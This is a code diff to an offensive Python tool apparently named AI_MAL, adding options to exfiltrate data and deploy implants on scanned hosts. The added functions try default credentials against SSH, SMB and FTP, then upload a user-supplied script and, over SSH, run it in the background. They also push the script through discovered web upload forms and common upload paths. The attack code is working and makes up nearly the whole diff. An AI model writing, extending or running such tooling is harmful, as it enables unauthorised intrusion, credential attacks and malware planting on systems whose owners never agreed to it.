@@ -14,6 +14,8 @@ from pathlib import Path
 import platform
 from dotenv import load_dotenv
 import aiohttp
+import io
+from urllib.parse import urljoin
 
 # Suppress asyncio warnings about event loop being closed - compatible with Python 3.11+ and 3.12+
 import warnings
@@ -101,6 +103,28 @@ class AI_MAL:
         self.quiet = kwargs.get('quiet', False)
         self.no_gui = kwargs.get('no_gui', False)
         
+        # Setup for data exfiltration
+        self.exfil_enabled = kwargs.get('exfil', False)
+        if self.exfil_enabled:
+            self.exfil_dir = Path(os.getenv('EXFIL_DIR', 'exfiltrated_data'))
+            self.exfil_dir.mkdir(exist_ok=True)
+            self.exfil_target_dir = self.exfil_dir / target.replace('.', '_')
+            self.exfil_target_dir.mkdir(exist_ok=True)
+            logger.info(f"Data exfiltration enabled. Files will be saved to {self.exfil_target_dir}")
+            
+        # Setup for implant deployment
+        self.implant_enabled = kwargs.get('implant') is not None
+        self.implant_path = kwargs.get('implant')
+        if self.implant_enabled:
+            if not os.path.exists(self.implant_path):
+                logger.error(f"Implant script not found: {self.implant_path}")
+                self.implant_enabled = False
+            else:
+                logger.info(f"Implant enabled. Will attempt to deploy {self.implant_path} to target systems")
+                # Create directory for implant logs
+                self.implant_logs_dir = Path('implant_logs')
+                self.implant_logs_dir.mkdir(exist_ok=True)
+        
     async def run(self):
         try:
             # Show welcome banner
@@ -134,6 +158,32 @@ class AI_MAL:
                     
                     # Show scan results summary
                     self._display_scan_summary(scan_results)
+                    
+                    # Exfiltration
+                    exfil_results = None
+                    if self.exfil_enabled:
+                        exfil_task = progress.add_task("[red]Attempting data exfiltration...", total=100)
+                        progress.update(exfil_task, advance=10)
+                        
+                        logger.info("Attempting data exfiltration from target...")
+                        exfil_results = await self._exfiltrate_data(scan_results)
+                        progress.update(exfil_task, completed=100)
+                        
+                        # Display exfiltration results
+                        self._display_exfil_results(exfil_results)
+                    
+                    # Implant deployment
+                    implant_results = None
+                    if self.implant_enabled:
+                        implant_task = progress.add_task("[red bold]Deploying implant to target systems...", total=100)
+                        progress.update(implant_task, advance=10)
+                        
+                        logger.info(f"Attempting to deploy implant: {self.implant_path}")
+                        implant_results = await self._deploy_implant(scan_results)
+                        progress.update(implant_task, completed=100)
+                        
+                        # Display implant results
+                        self._display_implant_results(implant_results)
                     
                     # AI Analysis
                     analysis = None
@@ -227,6 +277,18 @@ class AI_MAL:
                 )
                 logger.info(f"Scan completed on target: {self.target}")
 
+                # Exfiltration
+                exfil_results = None
+                if self.exfil_enabled:
+                    logger.info("Attempting data exfiltration from target...")
+                    exfil_results = await self._exfiltrate_data(scan_results)
+                
+                # Implant deployment
+                implant_results = None
+                if self.implant_enabled:
+                    logger.info(f"Attempting to deploy implant: {self.implant_path}")
+                    implant_results = await self._deploy_implant(scan_results)
+                
                 # AI Analysis
                 analysis = None
                 if self.kwargs.get('ai_analysis', True):
@@ -489,6 +551,652 @@ class AI_MAL:
             table.add_row(name, script_type, description, path)
             
         console.print(table)
+        
+    def _display_exfil_results(self, results: Dict[str, Any]):
+        """Display exfiltration results in a table"""
+        if not RICH_AVAILABLE or self.quiet or not results:
+            return
+            
+        # Create a table for the exfiltration results
+        table = Table(title=f"[bold red]Data Exfiltration Results[/bold red]")
+        table.add_column("Status", style="bold")
+        table.add_column("Details", style="cyan")
+        
+        # Status row
+        status = "[green]SUCCESS[/green]" if results.get('success', False) else "[red]FAILED[/red]"
+        table.add_row("Status", status)
+        
+        # Files retrieved
+        files_count = results.get('files_retrieved', 0)
+        files_style = "green" if files_count > 0 else "red"
+        table.add_row("Files Retrieved", f"[{files_style}]{files_count}[/{files_style}]")
+        
+        # Methods succeeded
+        methods = results.get('methods_succeeded', [])
+        methods_str = ", ".join(methods) if methods else "None"
+        table.add_row("Successful Methods", methods_str)
+        
+        # Methods attempted
+        attempted = results.get('methods_attempted', [])
+        attempted_str = ", ".join(attempted) if attempted else "None"
+        table.add_row("Attempted Methods", attempted_str)
+        
+        # Storage location
+        if files_count > 0:
+            table.add_row("Storage Location", str(self.exfil_target_dir))
+        
+        console.print(table)
+        
+        # If successful, show a warning about the exfiltrated data
+        if results.get('success', False):
+            console.print(Panel(
+                "[bold yellow]Warning:[/bold yellow] Sensitive data may have been exfiltrated. "
+                "Review the contents carefully and handle according to your security policy.",
+                border_style="red"
+            ))
+
+    def _display_implant_results(self, results: Dict[str, Any]):
+        """Display implant deployment results in a table"""
+        if not RICH_AVAILABLE or self.quiet or not results:
+            return
+            
+        # Create a table for the implant results
+        table = Table(title=f"[bold red]Implant Deployment Results[/bold red]")
+        table.add_column("Status", style="bold")
+        table.add_column("Details", style="cyan")
+        
+        # Status row
+        status = "[green]SUCCESS[/green]" if results.get('success', False) else "[red]FAILED[/red]"
+        table.add_row("Status", status)
+        
+        # Targets implanted
+        implant_count = len(results.get('successful_targets', []))
+        implant_style = "green" if implant_count > 0 else "red"
+        table.add_row("Targets Implanted", f"[{implant_style}]{implant_count}[/{implant_style}]")
+        
+        # Successful targets
+        successful = results.get('successful_targets', [])
+        successful_str = "\n".join(successful) if successful else "None"
+        table.add_row("Successful Targets", successful_str)
+        
+        # Failed targets
+        failed = results.get('failed_targets', [])
+        failed_str = "\n".join(failed) if failed else "None"
+        table.add_row("Failed Targets", failed_str)
+        
+        # Methods succeeded
+        methods = results.get('methods_succeeded', [])
+        methods_str = ", ".join(methods) if methods else "None"
+        table.add_row("Successful Methods", methods_str)
+        
+        # Implant file
+        table.add_row("Implant Script", str(self.implant_path))
+        
+        console.print(table)
+        
+        # If successful, show a warning about the implanted targets
+        if results.get('success', False):
+            console.print(Panel(
+                "[bold yellow]Warning:[/bold yellow] Implants have been deployed to target systems. "
+                "Ensure proper cleanup once operations are complete.",
+                border_style="red"
+            ))
+
+    async def _deploy_implant(self, scan_results: Dict[str, Any]) -> Dict[str, Any]:
+        """
+        Attempt to deploy implant script to target systems using multiple methods
+        
+        Args:
+            scan_results: Results from nmap scan containing target information
+            
+        Returns:
+            Dictionary with implant deployment results
+        """
+        if not self.implant_enabled or not self.implant_path:
+            return {'success': False}
+            
+        logger.info(f"Starting implant deployment to {self.target}")
+        results = {
+            'success': False,
+            'successful_targets': [],
+            'failed_targets': [],
+            'methods_succeeded': [],
+            'methods_attempted': []
+        }
+        
+        hosts = scan_results.get('hosts', [])
+        if not hosts:
+            logger.warning("No hosts found in scan results for implant deployment")
+            return results
+        
+        # Read the implant script
+        try:
+            with open(self.implant_path, 'rb') as f:
+                implant_content = f.read()
+        except Exception as e:
+            logger.error(f"Error reading implant script: {str(e)}")
+            return results
+            
+        # Determine script type based on extension
+        script_extension = os.path.splitext(self.implant_path)[1].lower()
+        
+        # Create timestamp for this deployment attempt
+        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+        implant_log_file = self.implant_logs_dir / f"implant_log_{timestamp}.txt"
+        
+        # Log the deployment attempt
+        with open(implant_log_file, 'w') as log:
+            log.write(f"Implant deployment at {timestamp}\n")
+            log.write(f"Target: {self.target}\n")
+            log.write(f"Implant: {self.implant_path}\n\n")
+        
+        for host in hosts:
+            ip = host.get('ip')
+            if not ip:
+                continue
+                
+            logger.info(f"Attempting to deploy implant to {ip}")
+            
+            # Log current host
+            with open(implant_log_file, 'a') as log:
+                log.write(f"\nAttempting to implant {ip}:\n")
+            
+            # Extract information about open ports and services
+            open_ports = {}
+            for port_info in host.get('ports', []):
+                if port_info.get('state') == 'open':
+                    port = port_info.get('port')
+                    service = port_info.get('service', '')
+                    open_ports[port] = service
+            
+            # Attempt different implant methods based on available services
+            implant_success = False
+            
+            # Try SSH implant
+            if await self._implant_via_ssh(ip, open_ports, implant_content, script_extension, implant_log_file):
+                results['methods_succeeded'].append('ssh')
+                implant_success = True
+                
+            results['methods_attempted'].append('ssh')
+                
+            # Try SMB implant
+            if await self._implant_via_smb(ip, open_ports, implant_content, script_extension, implant_log_file):
+                results['methods_succeeded'].append('smb')
+                implant_success = True
+                
+            results['methods_attempted'].append('smb')
+                
+            # Try FTP implant
+            if await self._implant_via_ftp(ip, open_ports, implant_content, script_extension, implant_log_file):
+                results['methods_succeeded'].append('ftp')
+                implant_success = True
+                
+            results['methods_attempted'].append('ftp')
+            
+            # Try HTTP/web upload implant
+            if await self._implant_via_http(ip, open_ports, implant_content, script_extension, implant_log_file):
+                results['methods_succeeded'].append('http')
+                implant_success = True
+                
+            results['methods_attempted'].append('http')
+            
+            # Update results based on success
+            if implant_success:
+                results['successful_targets'].append(ip)
+                results['success'] = True
+            else:
+                results['failed_targets'].append(ip)
+        
+        # Log summary
+        with open(implant_log_file, 'a') as log:
+            log.write("\n\nSummary:\n")
+            log.write(f"Successful targets: {len(results['successful_targets'])}\n")
+            for target in results['successful_targets']:
+                log.write(f"- {target}\n")
+            log.write(f"Failed targets: {len(results['failed_targets'])}\n")
+            for target in results['failed_targets']:
+                log.write(f"- {target}\n")
+            log.write(f"Methods succeeded: {', '.join(results['methods_succeeded'])}\n")
+        
+        logger.info(f"Implant deployment complete. Successful targets: {len(results['successful_targets'])}")
+        return results
+        
+    async def _implant_via_ssh(self, target: str, open_ports: Dict[int, str], 
+                             implant_content: bytes, script_extension: str,
+                             log_file: Path) -> bool:
+        """Deploy implant via SSH if available"""
+        try:
+            import paramiko
+        except ImportError:
+            logger.warning("SSH implant requires paramiko module. Install with 'pip install paramiko'")
+            return False
+            
+        # Look for SSH ports (22, 2222, etc)
+        ssh_ports = [port for port, service in open_ports.items() 
+                    if service.lower() == 'ssh' or port == 22]
+        
+        if not ssh_ports:
+            logger.debug(f"No SSH service detected on {target}")
+            return False
+            
+        # Common username/password combinations to try
+        credentials = [
+            ('root', 'root'),
+            ('root', 'toor'),
+            ('root', 'password'),
+            ('admin', 'admin'),
+            ('user', 'user'),
+            ('kali', 'kali')
+        ]
+        
+        script_name = os.path.basename(self.implant_path)
+        
+        # Prepare execution commands based on script type
+        exec_commands = {
+            '.py': f"python3 /tmp/{script_name} &",
+            '.sh': f"bash /tmp/{script_name} &",
+            '.rb': f"ruby /tmp/{script_name} &",
+            '.pl': f"perl /tmp/{script_name} &",
+            '.php': f"php /tmp/{script_name} &"
+        }
+        
+        default_exec = f"chmod +x /tmp/{script_name} && /tmp/{script_name} &"
+        exec_command = exec_commands.get(script_extension, default_exec)
+        
+        success = False
+        for port in ssh_ports:
+            for username, password in credentials:
+                try:
+                    # Connect to SSH server
+                    logger.info(f"Attempting SSH implant on {target}:{port} with {username}:{password}")
+                    
+                    # Log attempt
+                    with open(log_file, 'a') as log:
+                        log.write(f"  SSH attempt: {target}:{port} with {username}:{password}\n")
+                    
+                    client = paramiko.SSHClient()
+                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                    client.connect(target, port=port, username=username, password=password, timeout=10)
+                    
+                    # Upload the implant script
+                    sftp = client.open_sftp()
+                    remote_path = f"/tmp/{script_name}"
+                    sftp.putfo(io.BytesIO(implant_content), remote_path)
+                    sftp.chmod(remote_path, 0o755)  # Make it executable
+                    sftp.close()
+                    
+                    logger.info(f"Successfully uploaded implant to {target} via SSH")
+                    with open(log_file, 'a') as log:
+                        log.write(f"  [SUCCESS] Uploaded implant to {remote_path}\n")
+                    
+                    # Execute the implant
+                    stdin, stdout, stderr = client.exec_command(exec_command)
+                    
+                    # Wait briefly for execution to start
+                    exit_status = stdout.channel.recv_exit_status()
+                    
+                    if exit_status == 0:
+                        logger.info(f"Successfully executed implant on {target} via SSH")
+                        with open(log_file, 'a') as log:
+                            log.write(f"  [SUCCESS] Executed implant with command: {exec_command}\n")
+                        success = True
+                    else:
+                        error = stderr.read().decode()
+                        logger.warning(f"Failed to execute implant on {target}: {error}")
+                        with open(log_file, 'a') as log:
+                            log.write(f"  [ERROR] Failed to execute: {error}\n")
+                    
+                    client.close()
+                    
+                    if success:
+                        return True
+                    
+                except Exception as e:
+                    logger.debug(f"SSH implant attempt failed: {str(e)}")
+                    with open(log_file, 'a') as log:
+                        log.write(f"  [ERROR] {str(e)}\n")
+                    
+        return success
+        
+    async def _implant_via_smb(self, target: str, open_ports: Dict[int, str],
+                             implant_content: bytes, script_extension: str,
+                             log_file: Path) -> bool:
+        """Deploy implant via SMB if available"""
+        try:
+            import smbclient
+        except ImportError:
+            logger.warning("SMB implant requires smbclient module. Install with 'pip install smbclient'")
+            return False
+            
+        # Look for SMB ports (139, 445)
+        smb_ports = [port for port, service in open_ports.items() 
+                    if service.lower() in ['smb', 'microsoft-ds', 'netbios-ssn'] 
+                    or port in [139, 445]]
+        
+        if not smb_ports:
+            logger.debug(f"No SMB service detected on {target}")
+            return False
+            
+        # Common username/password combinations to try
+        credentials = [
+            ('guest', ''),
+            ('', ''),
+            ('Administrator', ''),
+            ('Administrator', 'administrator'),
+            ('Administrator', 'password'),
+            ('admin', 'admin'),
+            ('user', 'user')
+        ]
+        
+        script_name = os.path.basename(self.implant_path)
+        success = False
+        
+        for username, password in credentials:
+            try:
+                # Connect to SMB server
+                logger.info(f"Attempting SMB implant on {target} with {username}:{password}")
+                
+                # Log attempt
+                with open(log_file, 'a') as log:
+                    log.write(f"  SMB attempt: {target} with {username}:{password}\n")
+                
+                # Configure SMB client
+                smbclient.ClientConfig(username=username, password=password)
+                
+                # Try to find a writable share
+                try:
+                    shares = smbclient.listdir(f'\\\\{target}\\')
+                except Exception as e:
+                    logger.debug(f"Error listing SMB shares: {str(e)}")
+                    with open(log_file, 'a') as log:
+                        log.write(f"  [ERROR] Listing shares: {str(e)}\n")
+                    continue
+                
+                writable_paths = [
+                    (share, '\\Windows\\Temp\\'),
+                    (share, '\\Temp\\'),
+                    (share, '\\'),
+                    ('C$', '\\Windows\\Temp\\'),
+                    ('C$', '\\Temp\\'),
+                    ('ADMIN$', '\\Temp\\'),
+                    ('IPC$', '\\')
+                ]
+                
+                for share, path in writable_paths:
+                    try:
+                        if share not in shares and not share.endswith('$'):
+                            continue
+                            
+                        # Try to write to this location
+                        unc_path = f'\\\\{target}\\{share}{path}{script_name}'
+                        
+                        logger.debug(f"Attempting to write to {unc_path}")
+                        with open(log_file, 'a') as log:
+                            log.write(f"  Trying to write to {unc_path}\n")
+                        
+                        with smbclient.open_file(unc_path, mode='wb') as f:
+                            f.write(implant_content)
+                            
+                        logger.info(f"Successfully uploaded implant to {target} via SMB")
+                        with open(log_file, 'a') as log:
+                            log.write(f"  [SUCCESS] Uploaded implant to {unc_path}\n")
+                            
+                        # SMB upload succeeded, but execution is more difficult
+                        # We would need a more complex method to execute it remotely
+                        # For Windows targets, we could use PsExec or WMI/WinRM if available
+                        
+                        # For now, just mark as partial success
+                        with open(log_file, 'a') as log:
+                            log.write(f"  [NOTE] Implant uploaded but not executed. Manual execution required.\n")
+                            
+                        success = True
+                        break
+                        
+                    except Exception as e:
+                        logger.debug(f"Failed to write to {share}{path}: {str(e)}")
+                        
+                if success:
+                    break
+                    
+            except Exception as e:
+                logger.debug(f"SMB implant attempt failed: {str(e)}")
+                with open(log_file, 'a') as log:
+                    log.write(f"  [ERROR] {str(e)}\n")
+                
+        return success
+        
+    async def _implant_via_ftp(self, target: str, open_ports: Dict[int, str],
+                             implant_content: bytes, script_extension: str,
+                             log_file: Path) -> bool:
+        """Deploy implant via FTP if available"""
+        import ftplib
+        
+        # Look for FTP ports (21, 2121, etc)
+        ftp_ports = [port for port, service in open_ports.items() 
+                    if service.lower() == 'ftp' or port == 21]
+        
+        if not ftp_ports:
+            logger.debug(f"No FTP service detected on {target}")
+            return False
+            
+        # Common username/password combinations to try
+        credentials = [
+            ('anonymous', 'anonymous@domain.com'),
+            ('anonymous', ''),
+            ('ftp', 'ftp'),
+            ('admin', 'admin'),
+            ('user', 'user'),
+            ('guest', 'guest')
+        ]
+        
+        script_name = os.path.basename(self.implant_path)
+        success = False
+        
+        for port in ftp_ports:
+            for username, password in credentials:
+                try:
+                    # Connect to FTP server
+                    logger.info(f"Attempting FTP implant on {target}:{port} with {username}:{password}")
+                    
+                    # Log attempt
+                    with open(log_file, 'a') as log:
+                        log.write(f"  FTP attempt: {target}:{port} with {username}:{password}\n")
+                    
+                    ftp = ftplib.FTP()
+                    ftp.connect(target, port, timeout=10)
+                    ftp.login(username, password)
+                    
+                    logger.info(f"FTP login successful on {target}:{port}")
+                    
+                    # Try to determine current directory and if we can write to it
+                    try:
+                        cwd = ftp.pwd()
+                        
+                        # Attempt to upload the implant
+                        ftp.storbinary(f'STOR {script_name}', io.BytesIO(implant_content))
+                        
+                        logger.info(f"Successfully uploaded implant to {target} via FTP")
+                        with open(log_file, 'a') as log:
+                            log.write(f"  [SUCCESS] Uploaded implant to {cwd}/{script_name}\n")
+                            
+                        # FTP upload succeeded, but we can't execute it directly
+                        # We need another access method (like SSH) to execute it
+                        with open(log_file, 'a') as log:
+                            log.write(f"  [NOTE] Implant uploaded but not executed. Manual execution required.\n")
+                            
+                        success = True
+                        
+                    except Exception as e:
+                        logger.debug(f"Failed to upload file via FTP: {str(e)}")
+                        with open(log_file, 'a') as log:
+                            log.write(f"  [ERROR] Upload failed: {str(e)}\n")
+                    
+                    # Try common writeable directories if primary attempt failed
+                    if not success:
+                        for directory in ['incoming', 'upload', 'pub', 'public', 'www', 'web', 'htdocs']:
+                            try:
+                                ftp.cwd(directory)
+                                ftp.storbinary(f'STOR {script_name}', io.BytesIO(implant_content))
+                                
+                                logger.info(f"Successfully uploaded implant to {target} via FTP")
+                                with open(log_file, 'a') as log:
+                                    log.write(f"  [SUCCESS] Uploaded implant to {directory}/{script_name}\n")
+                                    
+                                success = True
+                                break
+                                
+                            except Exception:
+                                continue
+                    
+                    ftp.quit()
+                    
+                    if success:
+                        return True
+                    
+                except Exception as e:
+                    logger.debug(f"FTP implant attempt failed: {str(e)}")
+                    with open(log_file, 'a') as log:
+                        log.write(f"  [ERROR] {str(e)}\n")
+                    
+        return success
+        
+    async def _implant_via_http(self, target: str, open_ports: Dict[int, str],
+                              implant_content: bytes, script_extension: str,
+                              log_file: Path) -> bool:
+        """Deploy implant via HTTP/HTTPS if web upload forms are available"""
+        import aiohttp
+        import re
+        
+        # Look for HTTP/HTTPS ports
+        http_ports = [port for port, service in open_ports.items() 
+                     if service.lower() in ['http', 'https', 'www', 'web'] 
+                     or port in [80, 443, 8080, 8443]]
+        
+        if not http_ports:
+            logger.debug(f"No HTTP service detected on {target}")
+            return False
+            
+        success = False
+        script_name = os.path.basename(self.implant_path)
+        
+        # Common web upload endpoints to try
+        upload_paths = [
+            '/upload.php',
+            '/upload',
+            '/file-upload',
+            '/admin/upload.php',
+            '/admin/fileupload',
+            '/wp-admin/upload.php',
+            '/dashboard/upload',
+            '/filemanager/upload.php'
+        ]
+        
+        # Create session for connection reuse
+        async with aiohttp.ClientSession() as session:
+            for port in http_ports:
+                if success:
+                    break
+                    
+                # Determine protocol (HTTP or HTTPS)
+                protocol = 'https' if (port == 443 or port == 8443) else 'http'
+                base_url = f"{protocol}://{target}:{port}"
+                
+                logger.info(f"Attempting HTTP implant on {base_url}")
+                with open(log_file, 'a') as log:
+                    log.write(f"  HTTP attempt: {base_url}\n")
+                
+                # First, scan the site for upload forms
+                try:
+                    async with session.get(base_url, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as response:
+                        if response.status == 200:
+                            html_content = await response.text()
+                            
+                            # Look for upload forms
+                            upload_form_pattern = re.compile(r'<form.*?enctype="multipart/form-data".*?>', re.IGNORECASE | re.DOTALL)
+                            upload_forms = upload_form_pattern.findall(html_content)
+                            
+                            if upload_forms:
+                                form_action_pattern = re.compile(r'action="([^"]+)"', re.IGNORECASE)
+                                for form in upload_forms:
+                                    match = form_action_pattern.search(form)
+                                    if match:
+                                        upload_url = match.group(1)
+                                        if not upload_url.startswith(('http://', 'https://')):
+                                            upload_url = urljoin(base_url, upload_url)
+                                            
+                                        logger.info(f"Found upload form at {upload_url}")
+                                        with open(log_file, 'a') as log:
+                                            log.write(f"  Found upload form at {upload_url}\n")
+                                            
+                                        # Try to upload implant through the form
+                                        file_field_pattern = re.compile(r'<input.*?type="file".*?name="([^"]+)"', re.IGNORECASE)
+                                        match = file_field_pattern.search(form)
+                                        file_field_name = match.group(1) if match else 'file'
+                                        
+                                        data = aiohttp.FormData()
+                                        data.add_field(file_field_name, 
+                                                     implant_content,
+                                                     filename=script_name,
+                                                     content_type='application/octet-stream')
+                                        
+                                        try:
+                                            async with session.post(upload_url, data=data, ssl=False, 
+                                                                timeout=aiohttp.ClientTimeout(total=20)) as upload_response:
+                                                if upload_response.status in [200, 201, 202]:
+                                                    resp_text = await upload_response.text()
+                                                    
+                                                    # Try to detect success indicators in response
+                                                    success_patterns = ['success', 'uploaded', 'complete', 'file saved']
+                                                    error_patterns = ['error', 'invalid', 'failed', 'too large']
+                                                    
+                                                    if any(pattern in resp_text.lower() for pattern in success_patterns) and \
+                                                       not any(pattern in resp_text.lower() for pattern in error_patterns):
+                                                        logger.info(f"Successfully uploaded implant to {target} via HTTP")
+                                                        with open(log_file, 'a') as log:
+                                                            log.write(f"  [SUCCESS] Uploaded implant via form\n")
+                                                        success = True
+                                                        break
+                                                    else:
+                                                        logger.debug("Upload form submission didn't indicate success")
+                                                        with open(log_file, 'a') as log:
+                                                            log.write(f"  [ERROR] Form submission response didn't indicate success\n")
+                                        except Exception as e:
+                                            logger.debug(f"Error submitting upload form: {str(e)}")
+                                            with open(log_file, 'a') as log:
+                                                log.write(f"  [ERROR] Form submission: {str(e)}\n")
+                except Exception as e:
+                    logger.debug(f"Error scanning for upload forms: {str(e)}")
+                    with open(log_file, 'a') as log:
+                        log.write(f"  [ERROR] Scanning for forms: {str(e)}\n")
+                
+                # If form scanning didn't work, try common upload endpoints
+                if not success:
+                    for path in upload_paths:
+                        try:
+                            upload_url = f"{base_url}{path}"
+                            
+                            logger.info(f"Trying upload endpoint: {upload_url}")
+                            with open(log_file, 'a') as log:
+                                log.write(f"  Trying upload endpoint: {upload_url}\n")
+                            
+                            data = aiohttp.FormData()
+                            data.add_field('file', 
+                                         implant_content,
+                                         filename=script_name,
+                                         content_type='application/octet-stream')
+                            
+                            async with session.post(upload_url, data=data, ssl=False, 
+                                                  timeout=aiohttp.ClientTimeout(total=10)) as response:
+                                if response.status in [200, 201, 202]:
+                                    logger.info(f"Upload endpoint {upload_url} accepted the file")
+                                    with open(log_file, 'a') as log:
+                                        log.write(f"  [POTENTIAL SUCCESS] Upload endpoint {upload_url} accepted the file\n")
+                                    success = True
+                                    break
+                        except Exception as e:
+                            logger.debug(f"Error with upload endpoint {path}: {str(e)}")
+        
+        return success
 
 async def check_and_pull_ollama_models(models: List[str]) -> Dict[str, bool]:
     """
@@ -611,6 +1319,8 @@ def main():
     scan_group.add_argument('--os', action='store_true', help='Enable OS detection')
     scan_group.add_argument('--vuln', action='store_true', help='Enable vulnerability scanning')
     scan_group.add_argument('--dos', action='store_true', help='Attempt Denial of Service attacks')
+    scan_group.add_argument('--exfil', action='store_true', help='Attempt to exfiltrate files from target systems')
+    scan_group.add_argument('--implant', metavar='PATH', help='Path to a script to implant on target machines')
     
     # Output Options
     output_group = parser.add_argument_group('Output Options')
